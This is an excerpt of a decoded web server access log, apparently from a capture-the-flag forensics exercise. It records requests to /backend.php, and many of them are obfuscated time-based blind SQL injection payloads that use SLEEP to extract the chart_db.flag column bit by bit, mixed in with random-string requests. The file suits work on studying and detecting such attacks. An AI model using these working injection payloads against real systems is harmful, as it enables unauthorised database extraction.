line_no	timestamp	decoded_request
306	01/Mar/2015:13:15:24 -0500	/backend.php?user=3Q00lcVSyBdswCz5SyscdQqj1iifECyirtGJYkkeGqyAtrnL2I4PBRo0lK1ZBnjBEMCKB
307	01/Mar/2015:13:15:25 -0500	/backend.php?user=R6dYSvmfPpUfEcUhDqE0wzJX4xbzVCFbUnKyPJDmU9a5DvJrMG50E
308	01/Mar/2015:13:15:23 -0500	/backend.php?user=admin' AND IF(/*vFtks*/SUBSTRING(REVERSE(/*nSpFQ1QRb77*/CONV(HEX(SUBSTRING(/*QRqw*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*jyYj0*/),4,1)),16,2))/*xWh1GK2T*/,3,1)=1,SLEEP(2),863536) AND '7359249
309	01/Mar/2015:13:15:25 -0500	/backend.php?user=admin' AND IF(/*3w7Cb*/SUBSTRING(REVERSE(/*WfN*/CONV(HEX(SUBSTRING(/*3arbiDGzxEm*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*hv*/),4,1)),16,2))/*TIZ*/,4,1)=1,SLEEP(2),429283766) AND '539632
310	01/Mar/2015:13:15:25 -0500	/backend.php?user=admin' AND IF(/*JaRVcQB*/SUBSTRING(REVERSE(/*6zsMekSK2*/CONV(HEX(SUBSTRING(/*fSjm0ACrtD*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*kscRA*/),4,1)),16,2))/*0VrQr2K*/,5,1)=1,SLEEP(2),2137815) AND '6299765
311	01/Mar/2015:13:15:25 -0500	/backend.php?user=admin' AND IF(/*1k6wvc53Z2B*/SUBSTRING(REVERSE(/*hQgc*/CONV(HEX(SUBSTRING(/*JBP7rd*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*NPe0SQ*/),4,1)),16,2))/*j2Sz*/,6,1)=1,SLEEP(2),7819) AND '49
312	01/Mar/2015:13:15:27 -0500	/backend.php?user=hzy2OO303qph13COwiFEfTpSetVwlHIr0zPaYoPCxhRCL6xQUyQso5FyHnluVHYjJPFFoDgL68sO93Ft5
313	01/Mar/2015:13:15:25 -0500	/backend.php?user=admin' AND IF(/*GL2CQZz*/SUBSTRING(REVERSE(/*s6g*/CONV(HEX(SUBSTRING(/*laH5*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*dds2g4vTSt*/),4,1)),16,2))/*e1kTtomb*/,7,1)=1,SLEEP(2),373169) AND '112358
314	01/Mar/2015:13:15:28 -0500	/backend.php?user=7y8UaxFSlWoSMyxFLZxg4ddNY
315	01/Mar/2015:13:15:29 -0500	/backend.php?user=mLt5oTw6O7KFkeODdhax6W4HrjImpZtcWLQVL10Aoq9oVLYnnEvx2h8xC4UyaqpqTFv4527G67YIQnKR
316	01/Mar/2015:13:15:27 -0500	/backend.php?user=admin' AND IF(/*Ny6VUf1*/SUBSTRING(REVERSE(/*0KAsR8o3YP*/CONV(HEX(SUBSTRING(/*m5tHA*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*3q9F*/),5,1)),16,2))/*64J1X*/,1,1)=1,SLEEP(2),4112) AND '99
317	01/Mar/2015:13:15:29 -0500	/backend.php?user=admin' AND IF(/*JPWczESV0*/SUBSTRING(REVERSE(/*TypyG*/CONV(HEX(SUBSTRING(/*Jdoyd192Zq*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*4BK3XP*/),5,1)),16,2))/*AfC02*/,2,1)=1,SLEEP(2),23917) AND '2797287
318	01/Mar/2015:13:15:31 -0500	/backend.php?user=qLJQEpbzEMHBi71JqHqgQRap6JzmTAE90MySDKZLKvgdzOyUa1mk6aZZmiaMciJbg8WjrT8jjoOR0vamhYQUu
319	01/Mar/2015:13:15:29 -0500	/backend.php?user=admin' AND IF(/*ECHJqEQHZy6*/SUBSTRING(REVERSE(/*ncnKwsGO6m*/CONV(HEX(SUBSTRING(/*daISXCI7Vy*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*pzJIta1i*/),5,1)),16,2))/*mcapFWI*/,3,1)=1,SLEEP(2),236524) AND '62633
320	01/Mar/2015:13:15:32 -0500	/backend.php?user=XxxovjoCftAhGWrvbIynhkQtquKg3W00Bt5pZo5LdYgPyRitdBLgqOfeR7tkfELeK9vQziKDxapEo3SxM
321	01/Mar/2015:13:15:33 -0500	/backend.php?user=FU1wTG9XET1a
322	01/Mar/2015:13:15:31 -0500	/backend.php?user=admin' AND IF(/*d1*/SUBSTRING(REVERSE(/*CMme*/CONV(HEX(SUBSTRING(/*PpEeSgO*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*C50rIJqbLl*/),5,1)),16,2))/*3xN*/,4,1)=1,SLEEP(2),112757) AND '465449
323	01/Mar/2015:13:15:33 -0500	/backend.php?user=admin' AND IF(/*VW90SCJP02*/SUBSTRING(REVERSE(/*95S72hQ4cX*/CONV(HEX(SUBSTRING(/*tdT9yOYhrE*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*sNG1z*/),5,1)),16,2))/*AkA7lxL*/,5,1)=1,SLEEP(2),62665383) AND '376
324	01/Mar/2015:13:15:35 -0500	/backend.php?user=7Fr8OOKNKLuoRt9irAzN210ODdjVuw6YJtdn9smfg3tW4P
325	01/Mar/2015:13:15:33 -0500	/backend.php?user=admin' AND IF(/*TMu*/SUBSTRING(REVERSE(/*g68aJWO*/CONV(HEX(SUBSTRING(/*4eNiSO*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*IbUrPNRfD*/),5,1)),16,2))/*MT*/,6,1)=1,SLEEP(2),918174471) AND '472533
326	01/Mar/2015:13:15:35 -0500	/backend.php?user=admin' AND IF(/*ndtQP*/SUBSTRING(REVERSE(/*kAwrr9Uxw*/CONV(HEX(SUBSTRING(/*HdSw4GRmu8*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*fpJMlA*/),5,1)),16,2))/*F63*/,7,1)=1,SLEEP(2),38473581) AND '51461
327	01/Mar/2015:13:15:37 -0500	/backend.php?user=ll8KuJeWla4
328	01/Mar/2015:13:15:35 -0500	/backend.php?user=admin' AND IF(/*a55LYOr0*/SUBSTRING(REVERSE(/*YPPLnMdg2*/CONV(HEX(SUBSTRING(/*TAbo*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*NN7rv9*/),6,1)),16,2))/*1ssMVPNG*/,1,1)=1,SLEEP(2),62585713) AND '691475
329	01/Mar/2015:13:15:38 -0500	/backend.php?user=8dVq7LMYXc
330	01/Mar/2015:13:15:39 -0500	/backend.php?user=pVoBp9XrfLlUl8MA1JzXG4Byw8fs4r5oLvI2oacEF4TarNOss1fjGRFKTR1S1RqYoaD3lV3I1fUZLWWzU6oy8ZoomlBqu
331	01/Mar/2015:13:15:37 -0500	/backend.php?user=admin' AND IF(/*p0HuVMMq*/SUBSTRING(REVERSE(/*Yh*/CONV(HEX(SUBSTRING(/*xJB4*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*5QtSyC97vq*/),6,1)),16,2))/*gFpD*/,2,1)=1,SLEEP(2),1567677) AND '232999
332	01/Mar/2015:13:15:40 -0500	/backend.php?user=IPAHt9oPbtzCu3umLpMd1VajefKQ3u9dpHmEFeA5xS9qi91jiipUrsFaZoUCXoTGJKWiCvUVOVNQz0ugO2w9YTU8FIs
333	01/Mar/2015:13:15:39 -0500	/backend.php?user=admin' AND IF(/*5q*/SUBSTRING(REVERSE(/*bIpeRx*/CONV(HEX(SUBSTRING(/*MBKSYsSFp*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*e1ssgDqirf3*/),6,1)),16,2))/*q0ZoW6*/,3,1)=1,SLEEP(2),826947519) AND '55
334	01/Mar/2015:13:15:42 -0500	/backend.php?user=TU9cqyX1pVAZnSg4il1bzL1pV8TtilT8En6KcQWMEcbcMmp8EBpumWpcvS46L
335	01/Mar/2015:13:15:42 -0500	/backend.php?user=admin' AND IF(/*Bhc0NQi0*/SUBSTRING(REVERSE(/*VufiA8B4rxw*/CONV(HEX(SUBSTRING(/*3Or*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*MYkg6WusK*/),6,1)),16,2))/*Fe*/,4,1)=1,SLEEP(2),6744265) AND '3128644
336	01/Mar/2015:13:15:44 -0500	/backend.php?user=admin' AND IF(/*P00zd7*/SUBSTRING(REVERSE(/*qS*/CONV(HEX(SUBSTRING(/*h5Lpm4Is*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*yWejhPRWcH*/),6,1)),16,2))/*pom*/,5,1)=1,SLEEP(2),49179) AND '644174
337	01/Mar/2015:13:15:44 -0500	/backend.php?user=hGNtuEva1JkXMmrAMgTcaQ8thqoF7mV78bvQ5pXgqEuGTdjRlYgtNm
338	01/Mar/2015:13:15:44 -0500	/backend.php?user=admin' AND IF(/*SJqQn*/SUBSTRING(REVERSE(/*Gq35GF*/CONV(HEX(SUBSTRING(/*wV*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*DX*/),6,1)),16,2))/*BHevZV*/,6,1)=1,SLEEP(2),48955119) AND '6535125
339	01/Mar/2015:13:15:46 -0500	/backend.php?user=qyBGEvrAyRucaFvpLcdx403zv6MFzYwpoPxAJ9lvUZufwbMeJSNxoBkKmwDGABgnFOJ
340	01/Mar/2015:13:15:47 -0500	/backend.php?user=cn8qeZRvQR8prDeSlju8vYCm8upivS0g3KNDw2zlt0ZgNXd45bsgLNUkIjQjhPchgRH3
341	01/Mar/2015:13:15:46 -0500	/backend.php?user=admin' AND IF(/*2zHniZwlu*/SUBSTRING(REVERSE(/*LLk*/CONV(HEX(SUBSTRING(/*K9jjkx4O8c*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ailmQX*/),6,1)),16,2))/*ugO*/,7,1)=1,SLEEP(2),3183) AND '8355
342	01/Mar/2015:13:15:48 -0500	/backend.php?user=admin' AND IF(/*c0Cnh*/SUBSTRING(REVERSE(/*ZW1LLtF8KC8*/CONV(HEX(SUBSTRING(/*SrncXLlm1Np*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*aFmdGip*/),7,1)),16,2))/*NSrtFK*/,1,1)=1,SLEEP(2),6185) AND '1349
343	01/Mar/2015:13:15:49 -0500	/backend.php?user=MmjTrhQNjTC7
344	01/Mar/2015:13:15:48 -0500	/backend.php?user=admin' AND IF(/*msk*/SUBSTRING(REVERSE(/*Dg7pwWTE4*/CONV(HEX(SUBSTRING(/*3Tmk*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*OhN6LZ*/),7,1)),16,2))/*RbhLFZR39MH*/,2,1)=1,SLEEP(2),866167) AND '495218
345	01/Mar/2015:13:15:50 -0500	/backend.php?user=admin' AND IF(/*zonkCVW7d*/SUBSTRING(REVERSE(/*fWlkphcgNK1*/CONV(HEX(SUBSTRING(/*jVd2mJ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*nP8*/),7,1)),16,2))/*J8dRJ*/,3,1)=1,SLEEP(2),513644) AND '92
346	01/Mar/2015:13:15:51 -0500	/backend.php?user=wrYxsp4Gv2ElZMtZ633sPQI73sJ4potcqTwj0TB4HURr
347	01/Mar/2015:13:15:50 -0500	/backend.php?user=admin' AND IF(/*FWtWCDxC*/SUBSTRING(REVERSE(/*0iUrTy*/CONV(HEX(SUBSTRING(/*cmD*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*hzjRvut*/),7,1)),16,2))/*LlJ*/,4,1)=1,SLEEP(2),22648) AND '7852
348	01/Mar/2015:13:15:53 -0500	/backend.php?user=Swdg1l3ONkERdULjL0r5VukgurcMPpQkbgwUa6T1W5HOeEvidbxB8UwdF9scLn3c0iSG3Qo2NWm3SHp
349	01/Mar/2015:13:15:52 -0500	/backend.php?user=admin' AND IF(/*Y8pxOb*/SUBSTRING(REVERSE(/*pw61VsO1h*/CONV(HEX(SUBSTRING(/*b7pl*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*b7oeaMg*/),7,1)),16,2))/*Ad*/,5,1)=1,SLEEP(2),26234) AND '33683
350	01/Mar/2015:13:15:54 -0500	/backend.php?user=maCL8iXs4M9vTA37vKJH9rdPfD0qlVuizjHbX45wOfmgtWMIbL
351	01/Mar/2015:13:15:54 -0500	/backend.php?user=admin' AND IF(/*QeIw0G*/SUBSTRING(REVERSE(/*qpTzqHbyF3*/CONV(HEX(SUBSTRING(/*NB8g*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*3fM*/),7,1)),16,2))/*Prj5lU*/,6,1)=1,SLEEP(2),5246) AND '55159
352	01/Mar/2015:13:15:56 -0500	/backend.php?user=diM2llwTkwbZMtJqVGRZbkIaqujGUlBFKfZ6ePjum1LiBiqYlcD61DUfAbBsTahuCg1XWZxLHC0sOaxZnRvbP
353	01/Mar/2015:13:15:57 -0500	/backend.php?user=MSDnXSRP9PnuMl6PRZ3F9ebzaD
354	01/Mar/2015:13:15:56 -0500	/backend.php?user=admin' AND IF(/*mX*/SUBSTRING(REVERSE(/*yOZJXms*/CONV(HEX(SUBSTRING(/*pAtcp*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*rvz*/),7,1)),16,2))/*madoIqmEjpb*/,7,1)=1,SLEEP(2),984285) AND '139957
355	01/Mar/2015:13:15:59 -0500	/backend.php?user=tbee0JXtV7viIjRUbnjod7P9ZConI0
356	01/Mar/2015:13:15:58 -0500	/backend.php?user=admin' AND IF(/*o0ZlxW*/SUBSTRING(REVERSE(/*BiwK4*/CONV(HEX(SUBSTRING(/*I0aGf*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*JjowEndEg*/),8,1)),16,2))/*iD*/,1,1)=1,SLEEP(2),21233871) AND '11598
357	01/Mar/2015:13:16:00 -0500	/backend.php?user=admin' AND IF(/*eZWS*/SUBSTRING(REVERSE(/*2o*/CONV(HEX(SUBSTRING(/*DhOTsdHU*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*yOrkSM*/),8,1)),16,2))/*CWHEhGhpP*/,2,1)=1,SLEEP(2),3346) AND '51482
358	01/Mar/2015:13:16:01 -0500	/backend.php?user=arRJzMVd0IiD
359	01/Mar/2015:13:16:00 -0500	/backend.php?user=admin' AND IF(/*eyO808trr*/SUBSTRING(REVERSE(/*Cjia7cJA*/CONV(HEX(SUBSTRING(/*R8P*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*tXW5sDbEQNi*/),8,1)),16,2))/*exy*/,3,1)=1,SLEEP(2),749584465) AND '4694
360	01/Mar/2015:13:16:02 -0500	/backend.php?user=admin' AND IF(/*Bntj1lRjMJ*/SUBSTRING(REVERSE(/*qTwWL7*/CONV(HEX(SUBSTRING(/*3nCCkZT*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*rn*/),8,1)),16,2))/*f39Osy6y*/,4,1)=1,SLEEP(2),593116) AND '755
361	01/Mar/2015:13:16:02 -0500	/backend.php?user=IIzxFLQcrFAoojlGgdZCxizv3eAdtE61MszOP6rPQmcbjBtIcxyvcsIMrxRqTORPkV7jTkCepjZDsz7lpuEtd05UfzEr8Tz16r
362	01/Mar/2015:13:16:03 -0500	/backend.php?user=NZdZhGoM3yUNO3TJtnhslWrWX2
363	01/Mar/2015:13:16:02 -0500	/backend.php?user=admin' AND IF(/*UzUJKD*/SUBSTRING(REVERSE(/*lNu2*/CONV(HEX(SUBSTRING(/*N0WmC*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*sSmeg62t5*/),8,1)),16,2))/*8PDh0*/,5,1)=1,SLEEP(2),7949) AND '814
364	01/Mar/2015:13:16:04 -0500	/backend.php?user=5gdilClHUUa2hcARJrA
365	01/Mar/2015:13:16:05 -0500	/backend.php?user=FvrIpD4fMsRsHSFOzLBs6aNPlBEplVfVeUJKgmrhuFeOIU3o1tx00b5CpFGHyQdeMi4ZTQxlmnKTmz9nSd3Blb7XoZQ7Cu
366	01/Mar/2015:13:16:04 -0500	/backend.php?user=admin' AND IF(/*QbcjIo*/SUBSTRING(REVERSE(/*k2TmyZ*/CONV(HEX(SUBSTRING(/*ojhO8I*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*2MnZ90*/),8,1)),16,2))/*lsBTR*/,6,1)=1,SLEEP(2),72819) AND '214
367	01/Mar/2015:13:16:06 -0500	/backend.php?user=admin' AND IF(/*goB7GhS6*/SUBSTRING(REVERSE(/*Ge*/CONV(HEX(SUBSTRING(/*lVLgByzZg*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*iXUI2bfl*/),8,1)),16,2))/*Mva*/,7,1)=1,SLEEP(2),48194494) AND '17196
368	01/Mar/2015:13:16:07 -0500	/backend.php?user=xYUG4f5bQVaT2h3Z51Ex2VY5Qy2hwI86fY1ml4MPpgnF4Igu0cXM49yyYrO1knemEQejpZB7jFJ9WzLWFzTf2Wouy
369	01/Mar/2015:13:16:06 -0500	/backend.php?user=admin' AND IF(/*EZhuIN3hTu*/SUBSTRING(REVERSE(/*8h5*/CONV(HEX(SUBSTRING(/*akaiNNc90*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*elTQf3*/),9,1)),16,2))/*ElF5n5HV*/,1,1)=1,SLEEP(2),669379241) AND '972266
370	01/Mar/2015:13:16:08 -0500	/backend.php?user=jJMSyRX4C6HYsCaB79Z6LoBZbWdCdAXB
371	01/Mar/2015:13:16:08 -0500	/backend.php?user=admin' AND IF(/*vJwooyN*/SUBSTRING(REVERSE(/*wDzR6E*/CONV(HEX(SUBSTRING(/*imT*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*9lEhqYS5T7*/),9,1)),16,2))/*lExmwBgsH4Z*/,2,1)=1,SLEEP(2),292727438) AND '3752741
372	01/Mar/2015:13:16:10 -0500	/backend.php?user=admin' AND IF(/*NsVVvvgo7gY*/SUBSTRING(REVERSE(/*S1VDviF1A*/CONV(HEX(SUBSTRING(/*dFWiW84*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*1q*/),9,1)),16,2))/*ZOcMYGWN*/,3,1)=1,SLEEP(2),89257266) AND '19765
373	01/Mar/2015:13:16:10 -0500	/backend.php?user=mDoWJefuQRkPXmUqWywaEkKt1FJC0Pgs8SsP5UaWaGliHIOvDYL47hnumb4amQZ0zAe1fmEzhj0YKZf
374	01/Mar/2015:13:16:10 -0500	/backend.php?user=admin' AND IF(/*GPl1TjJ2hro*/SUBSTRING(REVERSE(/*bl0*/CONV(HEX(SUBSTRING(/*vsCyzfpWos*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*4Xg0P*/),9,1)),16,2))/*LskTKQi*/,4,1)=1,SLEEP(2),284636649) AND '9946816
375	01/Mar/2015:13:16:12 -0500	/backend.php?user=admin' AND IF(/*ds*/SUBSTRING(REVERSE(/*u4*/CONV(HEX(SUBSTRING(/*szcXFr9Ae*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*SAutuRcme*/),9,1)),16,2))/*js63j*/,5,1)=1,SLEEP(2),34752) AND '3494
376	01/Mar/2015:13:16:12 -0500	/backend.php?user=admin' AND IF(/*P0GlX*/SUBSTRING(REVERSE(/*80RU*/CONV(HEX(SUBSTRING(/*28rCpFjeNZy*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*rix4MB*/),9,1)),16,2))/*1m*/,6,1)=1,SLEEP(2),638626) AND '9968
377	01/Mar/2015:13:16:12 -0500	/backend.php?user=2Ffqv6AzLiAse
378	01/Mar/2015:13:16:12 -0500	/backend.php?user=admin' AND IF(/*EGqJCv*/SUBSTRING(REVERSE(/*F337ukhI4x2*/CONV(HEX(SUBSTRING(/*09QJlhSVgq4*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*rGP*/),9,1)),16,2))/*Cf*/,7,1)=1,SLEEP(2),96779199) AND '516559
379	01/Mar/2015:13:16:14 -0500	/backend.php?user=uea3iDXlhnIMOgqdM1
380	01/Mar/2015:13:16:15 -0500	/backend.php?user=XoEHPOyV8nMFkOd0vuNw6cuslTJPvO3CXi2R7T3kl8zFKBJr6uiM5
381	01/Mar/2015:13:16:14 -0500	/backend.php?user=admin' AND IF(/*en6kSGiOm*/SUBSTRING(REVERSE(/*ivaFDNSZH1*/CONV(HEX(SUBSTRING(/*7kBi0*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Ad5sD9*/),10,1)),16,2))/*MHEfEmgAYX*/,1,1)=1,SLEEP(2),546522) AND '137836
382	01/Mar/2015:13:16:16 -0500	/backend.php?user=admin' AND IF(/*Wrt2t7e8*/SUBSTRING(REVERSE(/*Y2lg6t*/CONV(HEX(SUBSTRING(/*LoMsk4*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*BopqIRN2cx8*/),10,1)),16,2))/*1ajVW*/,2,1)=1,SLEEP(2),364896) AND '4798863
383	01/Mar/2015:13:16:17 -0500	/backend.php?user=uF4gtrvdt4KRKBedPuHM2G1ncBl3yFgi7uGSfcRX
384	01/Mar/2015:13:16:16 -0500	/backend.php?user=admin' AND IF(/*gui*/SUBSTRING(REVERSE(/*KwuG*/CONV(HEX(SUBSTRING(/*Bbsm*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*ASsdhp*/),10,1)),16,2))/*3Gg*/,3,1)=1,SLEEP(2),2836) AND '51
385	01/Mar/2015:13:16:18 -0500	/backend.php?user=admin' AND IF(/*bV3d5pNLK*/SUBSTRING(REVERSE(/*Op2JeeQ*/CONV(HEX(SUBSTRING(/*vZsQ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*5T*/),10,1)),16,2))/*NDa3AUE*/,4,1)=1,SLEEP(2),839238) AND '98
386	01/Mar/2015:13:16:19 -0500	/backend.php?user=NR5ZZ5LaBnQqGPCPOAFbPnRJRNRn
387	01/Mar/2015:13:16:18 -0500	/backend.php?user=admin' AND IF(/*vB*/SUBSTRING(REVERSE(/*KDBN*/CONV(HEX(SUBSTRING(/*nBg0U*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*lJUoV7N22*/),10,1)),16,2))/*NHabnkm0Z*/,5,1)=1,SLEEP(2),9967942) AND '5683668
388	01/Mar/2015:13:16:21 -0500	/backend.php?user=9rfp5wr35YffSljdmLVUi6hYd0a7Tpmybo0gfm9PhkAtg4wMtSB6lQQ7f
389	01/Mar/2015:13:16:20 -0500	/backend.php?user=admin' AND IF(/*OW6c*/SUBSTRING(REVERSE(/*dpvfv*/CONV(HEX(SUBSTRING(/*8HLsiX9*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*mSqxr8veZ*/),10,1)),16,2))/*elva*/,6,1)=1,SLEEP(2),65932) AND '3565685
390	01/Mar/2015:13:16:22 -0500	/backend.php?user=admin' AND IF(/*UXJNGgFf*/SUBSTRING(REVERSE(/*nO1N4znF*/CONV(HEX(SUBSTRING(/*wLFCMD*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*4qkKzS*/),10,1)),16,2))/*oOTq1c8ewr*/,7,1)=1,SLEEP(2),736836777) AND '6491
391	01/Mar/2015:13:16:22 -0500	/backend.php?user=admin' AND IF(/*ZbaU*/SUBSTRING(REVERSE(/*zS*/CONV(HEX(SUBSTRING(/*Alx6h78uxup*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*awNAm6eDu*/),11,1)),16,2))/*AWNJ0fTu*/,1,1)=1,SLEEP(2),682742) AND '349
392	01/Mar/2015:13:16:22 -0500	/backend.php?user=raGQZJeuU1qQL5DsYhgeFMg2a5vNyJBJho1YMHnajm99tO8EjBWV8L1fgdThhm5V6LWdm1PP8xh2D94HBrzP
393	01/Mar/2015:13:16:22 -0500	/backend.php?user=admin' AND IF(/*mO*/SUBSTRING(REVERSE(/*fRTleCUN2j*/CONV(HEX(SUBSTRING(/*Mvd*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*h4rm9dgt*/),11,1)),16,2))/*HqCwhoz*/,2,1)=1,SLEEP(2),262789647) AND '228
394	01/Mar/2015:13:16:24 -0500	/backend.php?user=eXr88XskucjTvTL91nmUdMhAnuSuQNfcD088GqNgPKZIXwepKdYgkMZomfHdwqtnIBQ
395	01/Mar/2015:13:16:25 -0500	/backend.php?user=7TW4L2tv21F6IaiFEp9PUyfCLqm
396	01/Mar/2015:13:16:24 -0500	/backend.php?user=admin' AND IF(/*vmXyiUG*/SUBSTRING(REVERSE(/*YKPU3pjdQE*/CONV(HEX(SUBSTRING(/*CC9kqdT3*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*6rvL*/),11,1)),16,2))/*2IwFw21CYYJ*/,3,1)=1,SLEEP(2),673973) AND '19
397	01/Mar/2015:13:16:26 -0500	/backend.php?user=admin' AND IF(/*YeHRgh*/SUBSTRING(REVERSE(/*PxPivsd8IH*/CONV(HEX(SUBSTRING(/*nTdl*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*jcOJt3Xz9*/),11,1)),16,2))/*aBvuF9A*/,4,1)=1,SLEEP(2),269128313) AND '997
398	01/Mar/2015:13:16:27 -0500	/backend.php?user=PfVjmGWUcGGcD7noxxzjk8kyhT7xE8xh0FtA30D72KQzqrpSmClHfMa9s
399	01/Mar/2015:13:16:26 -0500	/backend.php?user=admin' AND IF(/*GDc*/SUBSTRING(REVERSE(/*BIlmV0Vyz*/CONV(HEX(SUBSTRING(/*Ao38fa2*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Ue*/),11,1)),16,2))/*s8UVsVQ*/,5,1)=1,SLEEP(2),1692167) AND '417
400	01/Mar/2015:13:16:28 -0500	/backend.php?user=admin' AND IF(/*A51Ed5qO*/SUBSTRING(REVERSE(/*KB60o*/CONV(HEX(SUBSTRING(/*dwPV*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*lyswrE*/),11,1)),16,2))/*L4fpEc*/,6,1)=1,SLEEP(2),861693386) AND '3176911
401	01/Mar/2015:13:16:29 -0500	/backend.php?user=IErZlgm81SzHO7TPIKfaCW2Z7Y3ORpwQaIFLNGMXYBIuF
402	01/Mar/2015:13:16:28 -0500	/backend.php?user=admin' AND IF(/*9WIe*/SUBSTRING(REVERSE(/*PH53NCE*/CONV(HEX(SUBSTRING(/*hejqqHI8X9*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*M9ba5WU9ERI*/),11,1)),16,2))/*udw40UUNcI*/,7,1)=1,SLEEP(2),2379575) AND '69
403	01/Mar/2015:13:16:30 -0500	/backend.php?user=admin' AND IF(/*Tgwywc*/SUBSTRING(REVERSE(/*FUzIsG7m5*/CONV(HEX(SUBSTRING(/*rCVJp*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*TsGb7*/),12,1)),16,2))/*qHdNsiR8h*/,1,1)=1,SLEEP(2),976467) AND '8999749
404	01/Mar/2015:13:16:30 -0500	/backend.php?user=eejPPypS1Jd6AWwRVhFnYBS7ChOFoe0MehhWmVQSKU0f8bmw
